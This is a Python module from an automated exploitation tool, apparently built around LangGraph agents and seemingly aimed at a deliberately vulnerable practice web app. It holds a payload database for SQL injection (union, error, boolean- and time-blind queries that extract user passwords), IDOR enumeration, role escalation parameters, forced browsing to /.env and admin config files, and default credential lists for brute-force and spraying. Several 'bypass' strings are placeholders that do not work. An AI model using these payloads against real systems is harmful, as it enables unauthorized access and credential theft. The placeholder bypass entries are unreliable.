"""Payload library — per-vulnerability payload database and mutation engine."""

from dataclasses import dataclass, field


_SECURITY_LEVELS = {"low", "medium", "high"}


@dataclass(frozen=True)
class PayloadSet:
    """Immutable container for payloads associated with a single vulnerability class.

    Attributes:
        probe: Simple detection payloads used in Stage 1 of exploitation.
        exploit: Exploitation payloads used when a vulnerability is confirmed.
        bypass: Security-level–specific bypass payloads. Keyed by level name
            (``"low"``, ``"medium"``, ``"high"``).
    """

    probe: list[str] = field(default_factory=list)
    exploit: list[str] = field(default_factory=list)
    bypass: dict[str, list[str]] = field(default_factory=dict)


class PayloadLibrary:
    """Retrieve payloads by vulnerability class and security level."""

    _PAYLOAD_DB: dict[str, PayloadSet] = {
        "sqli_union": PayloadSet(
            probe=["1' UNION SELECT null-- -", "1' UNION SELECT 1,2-- -"],
            exploit=["1' UNION SELECT user(),database()-- -", "1' UNION SELECT user,password FROM users-- -"],
            bypass={
                "medium": ["1 UNION SELECT user,password FROM users#"],
                "high": ["1' UNION SELECT user,password FROM users LIMIT 1-- -"],
            },
        ),
        "sqli_error": PayloadSet(
            probe=["1'", "1''", "1\""],
            exploit=["1' AND 1=0 UNION SELECT null,version()-- -"],
            bypass={
                "medium": ["1 AND 1=0 UNION SELECT null,version()#"],
                "high": ["1' AND 1=0 UNION SELECT null,version() LIMIT 1-- -"],
            },
        ),
        "sqli_boolean_blind": PayloadSet(
            probe=["1' AND 1=1-- -", "1' AND 1=2-- -"],
            exploit=["1' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'-- -"],
            bypass={
                "medium": ["1 AND 1=1#", "1 AND 1=2#"],
                "high": ["1'/**/AND/**/1=1-- -"],
            },
        ),
        "sqli_time_blind": PayloadSet(
            probe=["1' AND SLEEP(1)-- -", "1' AND pg_sleep(1)-- -"],
            exploit=["1' AND IF(ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>77,SLEEP(3),0)-- -"],
            bypass={
                "medium": ["1 AND SLEEP(3)#"],
                "high": ["1'/**/AND/**/SLEEP(3)-- -"],
            },
        ),
        "ac_idor": PayloadSet(
            probe=["id=1", "id=2", "id=3"],
            exploit=["id=4", "id=5", "id=6"],
            bypass={
                "medium": ["id=7", "id=8", "id=9"],
                "high": ["id=100", "id=200", "id=300"],
            },
        ),
        "ac_vertical_escalation": PayloadSet(
            probe=["role=user", "role=admin"],
            exploit=["role=admin&user_id=1", "elevate=1"],
            bypass={
                "medium": ["role=admin%00user"],
                "high": ["x-role: admin"],
            },
        ),
        "ac_force_browse": PayloadSet(
            probe=["/admin", "/config", "/backup"],
            exploit=["/admin/config.php", "/.env"],
            bypass={
                "medium": ["/admin%2fconfig.php"],
                "high": ["/admin/./config.php"],
            },
        ),
        "bf_dictionary": PayloadSet(
            probe=["admin:password", "admin:admin"],
            exploit=["gordonb:abc123", "pablo:letmein", "admin:password"],
            bypass={
                "medium": ["admin:password:delay=500ms"],
                "high": ["admin:password:captcha=bypass"],
            },
        ),
        "bf_spray": PayloadSet(
            probe=["admin:password", "user:password"],
            exploit=["admin:password", "user:password", "test:test"],
            bypass={
                "medium": ["admin:password:delay=500ms"],
                "high": ["admin:password:captcha=bypass"],
            },
        ),
    }

    def get(self, vuln_class: str, security_level: str = "low") -> PayloadSet:
        """Return a defensive copy of payloads for ``vuln_class``.

        Unknown classes resolve to an empty ``PayloadSet``.
        Unknown security levels are normalized to ``"low"``.
        """
        payload_set = self._PAYLOAD_DB.get(vuln_class)
        if payload_set is None:
            return PayloadSet()

        normalized_level = security_level.lower().strip()
        if normalized_level not in _SECURITY_LEVELS:
            normalized_level = "low"

        bypass_copy = {
            level: list(values)
            for level, values in payload_set.bypass.items()
            if isinstance(level, str)
        }
        # Ensure the requested level key always exists for simple consumers.
        bypass_copy.setdefault(normalized_level, list(payload_set.bypass.get(normalized_level, [])))

        return PayloadSet(
            probe=list(payload_set.probe),
            exploit=list(payload_set.exploit),
            bypass=bypass_copy,
        )

    @staticmethod
    def record_tried(state: dict, agent_id: str, payload: str) -> dict:
        """Produce a partial state update recording *payload* as tried for *agent_id*.

        This is a pure function that returns a new dict without mutating *state*.
        The returned dict can be merged into LangGraph state via the appropriate
        reducer.

        Args:
            state: Current exploitation state (read-only).
            agent_id: Agent ID (e.g. ``"sqli_union"``).
            payload: Payload string that was attempted.

        Returns:
            Partial state update: ``{"tried_payloads": {agent_id: [...tried + payload]}}``
        """
        tried = dict(state.get("tried_payloads", {}))
        agent_tried = list(tried.get(agent_id, []))
        if payload not in agent_tried:
            agent_tried.append(payload)
        tried[agent_id] = agent_tried
        return {"tried_payloads": tried}

    @staticmethod
    def record_bypass(
        state: dict, technique: str, blocked_pattern: str | None = None
    ) -> dict:
        """Produce a partial state update recording a successful bypass technique.

        This is a pure function that returns a new dict without mutating *state*.

        Args:
            state: Current exploitation state (read-only).
            technique: Bypass technique that succeeded (e.g. ``"double_encode"``).
            blocked_pattern: The pattern that was bypassed, if known.

        Returns:
            Partial state update with ``"successful_bypasses"`` and optionally
            ``"blocked_patterns"``.
        """
        existing = list(state.get("successful_bypasses", []))
        additions = [] if technique in existing else [technique]

        update: dict = {"successful_bypasses": additions}
        if blocked_pattern:
            blocked_existing = list(state.get("blocked_patterns", []))
            update["blocked_patterns"] = [] if blocked_pattern in blocked_existing else [blocked_pattern]
        return update
